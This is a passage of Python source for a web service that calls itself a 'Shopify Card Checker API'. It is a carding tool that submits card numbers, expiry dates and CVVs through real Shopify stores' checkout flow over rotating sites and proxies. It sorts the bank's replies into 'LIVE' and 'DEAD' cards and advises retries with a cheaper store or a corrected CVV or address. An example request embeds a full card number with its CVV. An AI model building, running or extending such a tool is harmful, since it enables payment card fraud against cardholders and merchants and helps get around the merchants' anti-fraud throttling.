            if codes and typename == 'SubmitRejected':
                # Distinguish between checkout errors (UNTESTED) and card decline (DECLINED)
                # These codes mean the card was rejected during processing — before bank
                CARD_DECLINE_CODES = {
                    'CARD_DECLINED': 'Bank declined the card.',
                    'GENERIC_DECLINE': 'Bank declined the card.',
                    'DO_NOT_HONOR': 'Bank refused silently.',
                    'INSUFFICIENT_FUNDS': 'Bank confirmed card is LIVE. Balance too low.',
                    'INVALID_CVV': 'Card LIVE. CVV was wrong.',
                    'CVV_FAILURE': 'Card LIVE. CVV was wrong.',
                    'INCORRECT_CVC': 'Card LIVE. CVV was wrong.',
                    'AVS_FAILURE': 'Card LIVE. Address mismatch.',
                    'STOLEN_CARD': 'Card reported stolen.',
                    'LOST_CARD': 'Card reported lost.',
                    'EXPIRED_CARD': 'Card expired.',
                    'CARD_EXPIRED': 'Card expired.',
                    'INVALID_ACCOUNT': 'Account invalid or closed.',
                    'FRAUD_SUSPECTED': 'Bank flagged for fraud.',
                    'PICKUP_CARD': 'Bank wants card retained.',
                    'VELOCITY_LIMIT': 'Too many recent attempts.',
                    'EXCEEDS_LIMIT': 'Over per-transaction limit.',
                    'RESTRICTED_CARD': 'Merchant category restricted.',
                    'TXN_NOT_PERMITTED': 'Merchant category blocked.',
                    'TRANSACTION_NOT_ALLOWED': 'Merchant category blocked.',
                }
                # Check if any of the reject codes are card decline codes
                matched_decline = None
                for c in codes:
                    c_upper = c.upper()
                    if c_upper in CARD_DECLINE_CODES:
                        matched_decline = (c_upper, CARD_DECLINE_CODES[c_upper])
                        break
                
                if matched_decline:
                    # Card was declined during processing — return DECLINED
                    dc, dm = matched_decline
                    iso_map = {
                        'INSUFFICIENT_FUNDS': 'ISO 51', 'EXCEEDS_LIMIT': 'ISO 61',
                        'VELOCITY_LIMIT': 'ISO 65', 'DO_NOT_HONOR': 'ISO 05',
                        'STOLEN_CARD': 'ISO 43', 'LOST_CARD': 'ISO 41',
                        'EXPIRED_CARD': 'ISO 54', 'CARD_EXPIRED': 'ISO 54',
                        'INVALID_ACCOUNT': 'ISO 14', 'FRAUD_SUSPECTED': 'ISO 59',
                        'PICKUP_CARD': 'ISO 44', 'RESTRICTED_CARD': 'ISO 62',
                        'TXN_NOT_PERMITTED': 'ISO 57', 'TRANSACTION_NOT_ALLOWED': 'ISO 57',
                    }
                    iso = iso_map.get(dc, '')
                    # Determine sub-verdict
                    if dc in ('INSUFFICIENT_FUNDS', 'INVALID_CVV', 'CVV_FAILURE', 'INCORRECT_CVC', 'AVS_FAILURE'):
                        return running_total, "APPROVED LIVE", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': dc, 'iso': iso, 'meaning': dm}
                    elif dc in ('STOLEN_CARD', 'LOST_CARD', 'EXPIRED_CARD', 'CARD_EXPIRED', 'INVALID_ACCOUNT', 'FRAUD_SUSPECTED', 'PICKUP_CARD'):
                        return running_total, "DECLINED DEAD", gw_name, {'amount': running_total, 'verdict': 'DECLINED_DEAD', 'code': dc, 'iso': iso, 'meaning': dm}
                    else:
                        return running_total, "DECLINED", gw_name, {'amount': running_total, 'verdict': 'DECLINED', 'code': dc, 'iso': iso, 'meaning': dm}
                else:
                    # Checkout/gateway error — card never reached bank
                    return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': all_codes, 'iso': '', 'meaning': f'Submit rejected: {all_codes}. Bank never responded.'}

        if typename in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
            receipt_id = submit_data.get('receipt', {}).get('id')
        elif typename == 'SubmitFailed':
            return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': 'SUBMIT_FAIL', 'iso': '', 'meaning': f'Submit failed: {submit_data.get("reason", "unknown")}. Bank never responded.'}
        elif typename == 'Throttled':
            poll_ms = submit_data.get('pollAfter', 2000) or 2000
            await asyncio.sleep(min(int(poll_ms) / 1000.0, 3.0))
            text = await _do_submit()
            try:
                resp_json = json.loads(text)
                submit_data = resp_json.get('data', {}).get('submitForCompletion', {})
                if submit_data.get('__typename') in ('SubmitSuccess', 'SubmitAlreadyAccepted', 'SubmittedForCompletion'):
                    receipt_id = submit_data['receipt']['id']
                else:
                    return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': 'THROTTLED', 'iso': '', 'meaning': 'Shopify throttled the request. Bank never responded.'}
            except:
                return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': 'THROTTLED', 'iso': '', 'meaning': 'Shopify throttled the request. Bank never responded.'}
        elif typename == 'CheckpointDenied':
            return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': 'CHECKPOINT_DENIED', 'iso': '', 'meaning': 'Checkpoint denied. Bank never responded.'}
    except Exception as e:
        logger.info(f"Submit parse error: {str(e)[:100]} raw={text[:200]}")
        return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': 'SUBMIT_PARSE_ERROR', 'iso': '', 'meaning': f'Submit parse error. Bank never responded.'}

    if not receipt_id:
        return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': 'NO_RECEIPT', 'iso': '', 'meaning': 'No receipt returned. Bank never responded.'}

    # Poll for result — max 25s window
    await asyncio.sleep(1.0)
    poll_json = {'query': POLL_QUERY, 'variables': {'receiptId': receipt_id, 'sessionToken': sst}, 'operationName': 'PollForReceipt'}
    
    poll_start = time.monotonic()
    for _ in range(6):
        if time.monotonic() - poll_start > 25:
            return None, "UNTESTED - Receipt not settled in 25s window. Bank never responded.", gw_name, {'verdict': 'UNTESTED', 'code': 'POLL_TIMEOUT'}
        try:
            async with session.post(graphql_url, json=poll_json, headers=gql_headers, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                text = await resp.text()
        except Exception:
            continue
        if 'ProcessingReceipt' not in text and 'WaitingReceipt' not in text:
            break
        try:
            rj = json.loads(text)
            rcpt = rj.get('data', {}).get('receipt', {})
            delay = (rcpt.get('pollDelay', 4000) or 4000) / 1000.0
        except Exception:
            delay = 2.0
        delay = min(delay, 4.0)
        await asyncio.sleep(delay)

    logger.info(f"Poll settled in {time.monotonic() - poll_start:.1f}s")
    logger.info(f"Poll raw response: {text[:500]}")

    if 'ActionRequiredReceipt' in text:
        return running_total, "APPROVED 3DS - Card live, 3DS passed, order unconfirmed — verify manually", gw_name, {'amount': running_total, 'verdict': 'APPROVED_3DS'}

    if 'ProcessedReceipt' in text and 'processingError' not in text.lower() and 'FailedReceipt' not in text:
        return running_total, "APPROVED CHARGED - Order created — money moved", gw_name, {'amount': running_total, 'verdict': 'APPROVED_CHARGED'}

    # Parse bank code from FailedReceipt
    code = None
    error_message = None
    receipt_typename = None
    try:
        resp_json = json.loads(text)
        receipt = resp_json.get('data', {}).get('receipt', {})
        if isinstance(receipt, dict):
            receipt_typename = receipt.get('__typename', '')
            if receipt_typename == 'FailedReceipt':
                pe = receipt.get('processingError', {})
                code = pe.get('code', '') or ''
                error_message = pe.get('messageUntranslated', '') or ''
            elif receipt_typename == 'ProcessedReceipt':
                return running_total, "APPROVED CHARGED - Order created — money moved", gw_name, {'amount': running_total, 'verdict': 'APPROVED_CHARGED'}
    except Exception:
        pass

    if not code:
        code = _extract_between(text, '{"code":"', '"') or ''
    if not error_message:
        error_message = _extract_between(text, '"messageUntranslated":"', '"') or ''

    tl = (text + (code or '') + (error_message or '')).lower()
    code_lower = (code or '').lower()
    logger.info(f"Poll result: typename={receipt_typename} code={code} msg={error_message[:80]}")

    if 'ActionRequiredReceipt' in text:
        return running_total, "APPROVED 3DS - Card live, 3DS passed, order unconfirmed — verify manually", gw_name, {'amount': running_total, 'verdict': 'APPROVED_3DS'}

    # ── NEW VERDICT CLASSIFIER — with ISO codes and LIVE/DEAD split ─────

    code_lower = (code or '').lower()
    logger.info(f"Poll result: typename={receipt_typename} code={code} msg={error_message[:80]}")

    if 'ActionRequiredReceipt' in text:
        return running_total, "APPROVED 3DS", gw_name, {'amount': running_total, 'verdict': 'APPROVED_3DS', 'code': '3DS_REQUIRED', 'iso': '', 'meaning': 'Card LIVE. Bank requires 3DS challenge. Verify order manually.'}

    # RULE 1: ProcessedReceipt with order ID → APPROVED CHARGED
    if 'ProcessedReceipt' in text and 'FailedReceipt' not in text:
        order_id = ''
        try:
            rj = json.loads(text)
            order_id = rj.get('data', {}).get('receipt', {}).get('id', '')
        except Exception:
            pass
        return running_total, "APPROVED CHARGED", gw_name, {'amount': running_total, 'verdict': 'APPROVED_CHARGED', 'code': 'ORDER_CREATED', 'iso': '', 'meaning': 'Bank charged the card. Order ID returned.', 'order_id': order_id}

    # ── ISO CODE MAP ─────────────────────────────────────────────────────
    ISO_MAP = {
        'INSUFFICIENT_FUNDS': 'ISO 51',
        'EXCEEDS_LIMIT': 'ISO 61',
        'VELOCITY_LIMIT': 'ISO 65',
        'CARD_VELOCITY_EXCEEDED': 'ISO 65',
        'WITHDRAWAL_COUNT_LIMIT_EXCEEDED': 'ISO 65',
        'DO_NOT_HONOR': 'ISO 05',
        'CARD_DECLINED': '',
        'GENERIC_DECLINE': '',
        'GENERIC_ERROR': '',
        'STOLEN_CARD': 'ISO 43',
        'LOST_CARD': 'ISO 41',
        'EXPIRED_CARD': 'ISO 54',
        'CARD_EXPIRED': 'ISO 54',
        'INVALID_ACCOUNT': 'ISO 14',
        'FRAUD_SUSPECTED': 'ISO 59',
        'FRAUDULENT': 'ISO 59',
        'PICKUP_CARD': 'ISO 44',
        'RESTRICTED_CARD': 'ISO 62',
        'TXN_NOT_PERMITTED': 'ISO 57',
        'NOT_PERMITTED': 'ISO 57',
        'TRANSACTION_NOT_ALLOWED': 'ISO 57',
        'CARD_NOT_SUPPORTED': '',
        'PIN_ATTEMPTS': 'ISO 75',
        'INVALID_CVV': '',
        'CVV_FAILURE': '',
        'INCORRECT_CVC': '',
        'AVS_FAILURE': '',
        'ZIP_MISMATCH': '',
        'INCORRECT_ZIP': '',
        'INCORRECT_ADDRESS': '',
        'SECURITY_VIOLATION': '',
        'APPROVE_WITH_ID': '',
        'CALL_ISSUER': '',
    }

    code_upper = (code or '').upper()
    iso = ISO_MAP.get(code_upper, '')

    # ── APPROVED · LIVE — bank confirmed card exists ─────────────────────
    APPROVED_LIVE_CODES = {
        'INSUFFICIENT_FUNDS': 'Bank confirmed card is LIVE. Balance too low for this cart total. Retry on a cheaper store or after deposit.',
        'INVALID_CVV': 'Card LIVE. CVV was wrong. Retry with correct CVV.',
        'CVV_FAILURE': 'Card LIVE. CVV was wrong. Retry with correct CVV.',
        'INCORRECT_CVC': 'Card LIVE. CVV was wrong. Retry with correct CVV.',
        'AVS_FAILURE': 'Card LIVE. Address mismatch. Retry with correct billing address.',
        'ZIP_MISMATCH': 'Card LIVE. Address mismatch. Retry with correct billing address.',
        'INCORRECT_ZIP': 'Card LIVE. Address mismatch. Retry with correct billing address.',
        'INCORRECT_ADDRESS': 'Card LIVE. Address mismatch. Retry with correct billing address.',
    }
    if code_upper in APPROVED_LIVE_CODES:
        return running_total, "APPROVED LIVE", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': code_upper, 'iso': iso, 'meaning': APPROVED_LIVE_CODES[code_upper]}
    # Fuzzy matches for approved
    if any(k in tl for k in ['insuff', 'funds']):
        return running_total, "APPROVED LIVE", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': 'INSUFFICIENT_FUNDS', 'iso': 'ISO 51', 'meaning': 'Bank confirmed card is LIVE. Balance too low for this cart total. Retry on a cheaper store or after deposit.'}
    if any(k in tl for k in ['invalid_cvc', 'incorrect_cvc', 'cvv_failure', 'cvv_fail']):
        return running_total, "APPROVED LIVE", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': 'INVALID_CVV', 'iso': '', 'meaning': 'Card LIVE. CVV was wrong. Retry with correct CVV.'}
    if 'zip' in tl and ('invalid' in tl or 'incorrect' in tl):
        return running_total, "APPROVED LIVE", gw_name, {'amount': running_total, 'verdict': 'APPROVED_LIVE', 'code': 'AVS_FAILURE', 'iso': '', 'meaning': 'Card LIVE. Address mismatch. Retry with correct billing address.'}

    # ── DECLINED — bank/processor refused ──────────────────────────────
    DECLINED_LIVE_CODES = {
        'EXCEEDS_LIMIT': 'Over per-transaction limit.',
        'VELOCITY_LIMIT': 'Too many recent attempts.',
        'CARD_VELOCITY_EXCEEDED': 'Too many recent attempts.',
        'WITHDRAWAL_COUNT_LIMIT_EXCEEDED': 'Too many recent attempts.',
        'DO_NOT_HONOR': 'Bank refused silently.',
        'CARD_DECLINED': 'Bank declined the card.',
        'GENERIC_DECLINE': 'Bank declined the card.',
        'GENERIC_ERROR': 'Card declined by payment processor.',
        'APPROVE_WITH_ID': 'Approved but needs verification.',
        'CALL_ISSUER': 'Bank says call issuer.',
    }
    if code_upper in DECLINED_LIVE_CODES:
        return running_total, "DECLINED", gw_name, {'amount': running_total, 'verdict': 'DECLINED', 'code': code_upper, 'iso': iso, 'meaning': DECLINED_LIVE_CODES[code_upper]}

    # ── DECLINED · DEAD — hard decline, card is finished ─────────────────
    DECLINED_DEAD_CODES = {
        'STOLEN_CARD': 'Card reported stolen. Do not use.',
        'LOST_CARD': 'Card reported lost. Do not use.',
        'EXPIRED_CARD': 'Card expiry is in the past. Card dead.',
        'CARD_EXPIRED': 'Card expiry is in the past. Card dead.',
        'INVALID_ACCOUNT': 'Account invalid or closed. Card dead.',
        'FRAUD_SUSPECTED': 'Bank flagged card for fraud. Do not use.',
        'FRAUDULENT': 'Bank flagged card for fraud. Do not use.',
        'PICKUP_CARD': 'Bank wants card retained. Do not use.',
        'SECURITY_VIOLATION': 'Security violation. Card may be compromised.',
    }
    if code_upper in DECLINED_DEAD_CODES:
        return running_total, "DECLINED DEAD", gw_name, {'amount': running_total, 'verdict': 'DECLINED_DEAD', 'code': code_upper, 'iso': iso, 'meaning': DECLINED_DEAD_CODES[code_upper]}

    # ── DECLINED (plain) — merchant/category issues, not card-dead ───────
    DECLINED_PLAIN_CODES = {
        'RESTRICTED_CARD': 'Merchant category restricted.',
        'TXN_NOT_PERMITTED': 'Merchant category blocked.',
        'NOT_PERMITTED': 'Merchant category blocked.',
        'TRANSACTION_NOT_ALLOWED': 'Merchant category blocked.',
        'CARD_NOT_SUPPORTED': 'Brand not accepted by store.',
        'PIN_ATTEMPTS': 'Too many PIN tries.',
    }
    if code_upper in DECLINED_PLAIN_CODES:
        return running_total, "DECLINED", gw_name, {'amount': running_total, 'verdict': 'DECLINED', 'code': code_upper, 'iso': iso, 'meaning': DECLINED_PLAIN_CODES[code_upper]}

    # ── UNTESTED — Shopify gateway failure, bank never spoke ─────────────
    UNTESTED_EXACT = {
        'processing_error': 'Bank processing error. Bank never responded. Card untested.',
        'try_again_later': 'Bank says try again later. Bank never responded. Card untested.',
        'system_malfunction': 'System malfunction. Bank never responded. Card untested.',
        'issuer_not_available': 'Issuer unavailable. Bank never responded. Card untested.',
        'throttled': 'Shopify throttled the request. Bank never responded. Card untested.',
        'poll_timeout': 'Receipt poll timed out. Bank never responded. Card untested.',
        'delivery_delivery_line_detail_changed': 'Shopify checkout rejected delivery data. Bank never responded.',
        'delivery_method_not_available': 'Delivery method not available. Bank never responded.',
        'delivery_destination_invalid': 'Delivery destination invalid. Bank never responded.',
        'delivery_line_not_found': 'Delivery line not found. Bank never responded.',
        'delivery_expectation_mismatch': 'Delivery expectation mismatch. Bank never responded.',
        'payments_credit_card_base_expired': 'Payment session expired before submit. Card untested.',
        'negotiation_failed': 'Checkout negotiation failed. Bank never responded.',
        'checkout_not_found': 'Checkout session not found. Bank never responded.',
        'checkout_locked': 'Checkout session locked. Bank never responded.',
        'unable_to_process': 'Unable to process. Bank never responded.',
        'waiting_pending_terms': 'Checkout waiting for terms. Bank never responded.',
        'session_init': 'Session init failed. Bank never responded.',
        'session_expired': 'Session expired. Bank never responded.',
        'cart_empty': 'Cart was empty. Bank never responded.',
        'cart_fail': 'Cart creation failed. Bank never responded.',
        'vault_fail': 'Card vault failed. Bank never responded.',
        'submit_fail': 'Submit failed. Bank never responded.',
        'token_scrape': 'Token scrape failed. Bank never responded.',
        'no_product': 'No product found on store. Bank never responded.',
        'checkout_start': 'Checkout start failed. Bank never responded.',
        'captcha_required': 'Captcha required. Bank never responded.',
        'risk_check': 'Risk check failed. Bank never responded.',
        'checkpoint_denied': 'Checkpoint denied. Bank never responded.',
    }
    for k, reason in UNTESTED_EXACT.items():
        if k in tl:
            return None, f"UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': code_upper, 'iso': '', 'meaning': reason}

    # UNTESTED prefixes — any code starting with these is NOT a bank code
    UNTESTED_PREFIXES = ['delivery_', 'payments_', 'negotiation_', 'checkout_', 'session_', 'cart_', 'vault_', 'token_', 'invalid_variable', 'validation_', 'artifact_', 'input_']
    for prefix in UNTESTED_PREFIXES:
        if code_lower.startswith(prefix):
            return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': code_upper, 'iso': '', 'meaning': f'{code_upper}: Shopify/gateway error. Bank never responded. Card untested.'}

    # No code at all → UNTESTED
    if not code or code_lower in ('', 'unknown', 'null', 'none'):
        return None, "UNTESTED", gw_name, {'verdict': 'UNTESTED', 'code': '', 'iso': '', 'meaning': 'No bank response received. Bank never spoke.'}

    # Unknown code but card reached the bank = DECLINED
    # (bank returned a code we didn't recognize — it spoke, so card was tested)
    return running_total, "DECLINED", gw_name, {'amount': running_total, 'verdict': 'DECLINED', 'code': code_upper, 'iso': '', 'meaning': f'Bank returned unknown code {code_upper}.'}


async def check_card(cc, mm, yy, cvv, site=None, sites=None, proxy=None):
    start = time.time()
    card_short = f"{cc[:6]}xx{cc[-4:]}"

    proxy_url = None
    if proxy and proxy != "NONE" and proxy.strip():
        p = proxy.strip()
        if p.startswith("http://") or p.startswith("https://") or p.startswith("socks5://"):
            proxy_url = p
        elif ":" in p:
            parts = p.split(":")
            if len(parts) == 4:
                proxy_url = f"http://{parts[2]}:{parts[3]}@{parts[0]}:{parts[1]}"
            elif len(parts) == 2:
                proxy_url = f"http://{parts[0]}:{parts[1]}"

    requested_site = site.replace("https://", "").replace("http://", "").rstrip("/") if site else None

    if requested_site:
        sites_to_try = [requested_site]
    elif sites:
        cleaned = []
        for s in sites:
            if not s:
                continue
            s_clean = s.replace("https://", "").replace("http://", "").rstrip("/")
            # Filter out proxy-like entries (host:port:user:pass format)
            if s_clean.count(":") >= 3:
                continue
            # Filter out non-shopify entries
            if "." not in s_clean:
                continue
            cleaned.append(s_clean)
        random.shuffle(cleaned)
        sites_to_try = cleaned[:15]
    else:
        # No sites provided — can't check without sites
        elapsed = round(time.time() - start, 2)
        return {"status": "error", "response": "UNTESTED", "gateway": "Shopify Payments", "amount": None, "site": None, "elapsed": elapsed, "verdict": "UNTESTED", "code": "NO_SITES", "iso": "", "meaning": "No sites provided. Add sites via /addsite in bot."}

    async def _try_one_site(s, use_proxy):
        """Try one site, return result dict or None."""
        logger.info(f"Checking {card_short} on {s} proxy={use_proxy is not None}")
        try:
            kw = {"timeout": aiohttp.ClientTimeout(total=12, connect=4, sock_connect=4, sock_read=8), "connector": aiohttp.TCPConnector(ssl=False, limit=0, force_close=True)}
            if use_proxy:
                kw["proxy"] = use_proxy
            async with aiohttp.ClientSession(**kw) as session:
                result = await asyncio.wait_for(_shopify_check(session, s, cc, mm, yy, cvv), timeout=15)
                amount, response, gw_name = result[0], result[1], result[2]
                extra = result[3] if len(result) > 3 else None
                elapsed_now = round(time.time() - start, 2)
                verdict = extra.get('verdict', '') if extra else ''

                # UNTESTED = bank never saw the card → try next site
                # But DECLINED = bank DID respond → return immediately
                if verdict == 'UNTESTED' or (response and response.startswith('UNTESTED')):
                    logger.info(f"UNTESTED {s}: {response}")
                    return None

                # If we got a verdict from the bank (APPROVED/DECLINED), return it
                if verdict and verdict != 'UNTESTED':
                    r_code = extra.get('code', '') if extra else ''
                    r_iso = extra.get('iso', '') if extra else ''
                    r_meaning = extra.get('meaning', '') if extra else ''
                    r_order_id = extra.get('order_id', '') if extra else ''
                    return {"status": "ok", "response": response, "gateway": gw_name, "amount": amount, "site": s, "elapsed": elapsed_now, "verdict": verdict, "code": r_code, "iso": r_iso, "meaning": r_meaning, "order_id": r_order_id}

                # Chain failures
                chain_failures = ["no products", "no session", "no shipping", "checkpoint", "login", "password", "throttled", "gateway error", "negotiation", "no receipt", "invalid card", "no seller", "failed to add", "failed to create", "site requires", "payment method unavailable", "processing error"]
                if response and any(k in response.lower() for k in chain_failures):
                    logger.info(f"CHAIN FAIL {s}: {response}")
                    return None

                if _is_fake_gateway(gw_name):
                    return None

                return {"status": "ok", "response": response, "gateway": gw_name, "amount": amount, "site": s, "elapsed": elapsed_now, "verdict": verdict}
        except asyncio.TimeoutError:
            logger.info(f"TIMEOUT {s}")
            return None
        except Exception as e:
            logger.info(f"ERROR {s}: {str(e)[:80]}")
            return None

    async def _try_sites_parallel(site_list, use_proxy, max_concurrent=5):
        """Try all sites in parallel, return first real result."""
        semaphore = asyncio.Semaphore(max_concurrent)
        async def _guarded(s):
            async with semaphore:
                return await _try_one_site(s, use_proxy)
        tasks = [asyncio.create_task(_guarded(s)) for s in site_list]
        pending = set(tasks)
        while pending:
            done, pending = await asyncio.wait(pending, return_when=asyncio.FIRST_COMPLETED)
            for t in done:
                r = t.result()
                if r:
                    # Cancel all remaining tasks
                    for p in pending:
                        p.cancel()
                    return r
        return None

    # Try user sites in parallel
    result = await _try_sites_parallel(sites_to_try, proxy_url)
    if result:
        return result

    # If proxy failed all user sites, retry WITHOUT proxy using user sites
    if proxy_url:
        logger.info(f"Proxy failed all sites, retrying WITHOUT proxy...")
        result = await _try_sites_parallel(sites_to_try[:8], None)
        if result:
            return result

    elapsed = round(time.time() - start, 2)
    return {"status": "error", "response": "UNTESTED", "gateway": "Shopify Payments", "amount": None, "site": None, "elapsed": elapsed, "verdict": "UNTESTED", "code": "", "iso": "", "meaning": "All sites failed before reaching bank. Bank never responded."}


@app.get("/")
async def root():
    return {
        "status": "running",
        "service": "Shopify Card Checker API",
        "endpoints": {
            "GET /shopify": "Live card checker (params: site, cc, proxy)",
            "GET /check": "Site health checker (params: site, cc, proxy)",
            "GET /health": "Health check",
            "GET /status": "API status and info",
            "GET /sites": "List available sites",
        },
    }

@app.get("/health")
async def health():
    return {"status": "ok", "service": "Shopify Card Checker API", "uptime": "active"}

@app.get("/status")
async def status():
    return {
        "status": "online",
        "service": "Shopify Card Checker API",
        "sites": "managed by bot via /addsite",
        "verdicts": ["APPROVED_CHARGED", "APPROVED_LIVE", "APPROVED_3DS", "DECLINED", "DECLINED_DEAD", "UNTESTED"],
        "endpoints": {
            "GET /shopify": "Live card checker (params: site, cc, proxy)",
            "GET /check": "Site health checker (params: site, cc, proxy)",
            "GET /health": "Health check",
            "GET /status": "API status and info",
            "GET /sites": "Site info",
        },
    }

@app.get("/sites")
async def get_sites():
    return {"message": "Sites are managed by the bot via /addsite. Use the bot to add and view sites."}

# ── GET /shopify — Live Card Checker ──────────────────────────────────────
@app.get("/shopify")
async def shopify_get(site: str = None, cc: str = None, proxy: str = None):
    if not site or not cc:
        return {"error": "Missing required params: site, cc", "example": "/shopify?site=biggerfive.myshopify.com&cc=5555608113587131|04|28|896&proxy=ip:port:user:pass"}
    
    # Parse card from cc|mm|yy|cvv format
    parts = cc.split("|")
    if len(parts) != 4:
        return {"error": "Invalid card format. Use: cc|mm|yy|cvv"}
    card_num, mm, yy, cvv = parts
    if len(yy) == 4:
        yy = yy[2:]
    mm = mm.zfill(2)
    
    check_start = time.monotonic()
    logger.info(f"[shopify] {card_num} on {site} proxy={bool(proxy)} - start")
    
    try:
        result = await asyncio.wait_for(
            check_card(card_num, mm, yy, cvv, site=site, proxy=proxy),
            timeout=40
        )
    except asyncio.TimeoutError:
        elapsed = time.monotonic() - check_start
        return {
            "Response": "UNTESTED",
            "CC": cc,
            "Price": "N/A",
            "Gate": "Shopify Payments",
            "Site": site,
            "Charged": "False",
            "Approved": "False",
            "Time": f"{elapsed:.1f}s",
        }
    except Exception as e:
        elapsed = time.monotonic() - check_start
        return {
            "Response": "UNTESTED",
            "CC": cc,
            "Price": "N/A",
            "Gate": "Shopify Payments",
            "Site": site,
            "Charged": "False",
            "Approved": "False",
            "Time": f"{elapsed:.1f}s",
        }
    
    elapsed = time.monotonic() - check_start
    verdict = result.get("verdict", "")
    code = result.get("code", "")
    amount = result.get("amount", "N/A")
    gw = result.get("gateway", "Shopify Payments")
    result_site = result.get("site", site)
    
    charged = "True" if verdict == "APPROVED_CHARGED" else "False"
    approved = "True" if verdict in ("APPROVED_CHARGED", "APPROVED_LIVE", "APPROVED_3DS") else "False"
    
    # Map generic codes to user-friendly names
    RESPONSE_DISPLAY_MAP = {
        'GENERIC_ERROR': 'CARD_DECLINED',
        'GENERIC_DECLINE': 'CARD_DECLINED',
        'CARD_DECLINED': 'CARD_DECLINED',
        'DO_NOT_HONOR': 'DO_NOT_HONOR',
        'INSUFFICIENT_FUNDS': 'INSUFFICIENT_FUNDS',
        'INVALID_CVV': 'INVALID_CVV',
        'CVV_FAILURE': 'INVALID_CVV',
        'INCORRECT_CVC': 'INVALID_CVV',
        'AVS_FAILURE': 'AVS_FAILURE',
        'STOLEN_CARD': 'STOLEN_CARD',
        'LOST_CARD': 'LOST_CARD',
        'EXPIRED_CARD': 'EXPIRED_CARD',
        'CARD_EXPIRED': 'EXPIRED_CARD',
        'INVALID_ACCOUNT': 'INVALID_ACCOUNT',
        'FRAUD_SUSPECTED': 'FRAUD_SUSPECTED',
        'PICKUP_CARD': 'PICKUP_CARD',
        'VELOCITY_LIMIT': 'VELOCITY_LIMIT',
        'EXCEEDS_LIMIT': 'EXCEEDS_LIMIT',
        'RESTRICTED_CARD': 'RESTRICTED_CARD',
        'ORDER_CREATED': 'ORDER_CREATED',
        '3DS_REQUIRED': '3DS_REQUIRED',
    }
    display_code = RESPONSE_DISPLAY_MAP.get(code, code) if code else result.get("response", "UNKNOWN")
    
    return {
        "Response": display_code,
        "CC": cc,
        "Price": str(amount) if amount else "N/A",
        "Gate": gw,
        "Site": result_site or site,
        "Charged": charged,
        "Approved": approved,
        "Time": f"{elapsed:.1f}s",
    }

# ── GET /check — Site Health Checker ──────────────────────────────────────
@app.get("/check")
async def check_get(site: str = None, cc: str = None, proxy: str = None):
    if not site or not cc:
        return {"error": "Missing required params: site, cc", "example": "/check?site=biggerfive.myshopify.com&cc=5555608113587131|04|28|896&proxy=ip:port:user:pass"}
    
    # Parse card
    parts = cc.split("|")
    if len(parts) != 4:
        return {"error": "Invalid card format. Use: cc|mm|yy|cvv"}
    card_num, mm, yy, cvv = parts
    if len(yy) == 4:
        yy = yy[2:]
    mm = mm.zfill(2)
    
    clean_site = site.replace("https://", "").replace("http://", "").rstrip("/")
    
    # First check if site is alive and has products
    valid = False
    product_name = "N/A"
    product_price = "N/A"
    
    proxy_url = None
    if proxy and proxy != "NONE":
        p = proxy.strip()
        if p.startswith("http://") or p.startswith("https://"):
            proxy_url = p
        elif ":" in p:
            pparts = p.split(":")
            if len(pparts) == 4:
                proxy_url = f"http://{pparts[2]}:{pparts[3]}@{pparts[0]}:{pparts[1]}"
            elif len(pparts) == 2:
                proxy_url = f"http://{pparts[0]}:{pparts[1]}"
    
    try:
        kw = {"timeout": aiohttp.ClientTimeout(total=10), "connector": aiohttp.TCPConnector(ssl=False, force_close=True)}
        if proxy_url:
            kw["proxy"] = proxy_url
        async with aiohttp.ClientSession(**kw) as session:
            # Check if site has products
            for endpoint in [f"https://{clean_site}/collections/all/products.json?limit=5", f"https://{clean_site}/products.json?limit=5"]:
                try:
                    async with session.get(endpoint, headers={"User-Agent": _get_ua(), "Accept": "application/json"}, timeout=aiohttp.ClientTimeout(total=8)) as resp:
                        if resp.status == 200:
                            data = await resp.json(content_type=None)
                            product = _parse_products(data)
                            if product:
                                valid = True
                                product_price = product["price"]
                                # Try to get product name
                                try:
                                    prods = data.get("products", [])
                                    if prods:
                                        product_name = prods[0].get("title", "N/A")[:50]
                                except Exception:
                                    pass
                                break
                except Exception:
                    continue
    except Exception:
        pass
    
    if not valid:
        return {
            "valid": False,
            "site": site,
            "product": "N/A",
            "price": "N/A",
            "card_response": "SITE_DEAD",
            "gate": "N/A",
            "approved": "False",
            "charged": "False",
            "time": "0.0s",
        }
    
    # Now check the card
    check_start = time.monotonic()
    try:
        result = await asyncio.wait_for(
            check_card(card_num, mm, yy, cvv, site=clean_site, proxy=proxy),
            timeout=40
        )
    except asyncio.TimeoutError:
        elapsed = time.monotonic() - check_start
        return {
            "valid": True,
            "site": site,
            "product": product_name,
            "price": product_price,
            "card_response": "UNTESTED",
            "gate": "Shopify Payments",
            "approved": "False",
            "charged": "False",
            "time": f"{elapsed:.1f}s",
        }
    except Exception as e:
        elapsed = time.monotonic() - check_start
        return {
            "valid": True,
            "site": site,
            "product": product_name,
            "price": product_price,
            "card_response": "UNTESTED",
            "gate": "Shopify Payments",
            "approved": "False",
            "charged": "False",
            "time": f"{elapsed:.1f}s",
        }
    
    elapsed = time.monotonic() - check_start
    verdict = result.get("verdict", "")
    code = result.get("code", "")
    gw = result.get("gateway", "Shopify Payments")
    charged = "True" if verdict == "APPROVED_CHARGED" else "False"
    approved = "True" if verdict in ("APPROVED_CHARGED", "APPROVED_LIVE", "APPROVED_3DS") else "False"
    
    RESPONSE_DISPLAY_MAP = {
        'GENERIC_ERROR': 'CARD_DECLINED',
        'GENERIC_DECLINE': 'CARD_DECLINED',
        'CARD_DECLINED': 'CARD_DECLINED',
        'DO_NOT_HONOR': 'DO_NOT_HONOR',
        'INSUFFICIENT_FUNDS': 'INSUFFICIENT_FUNDS',
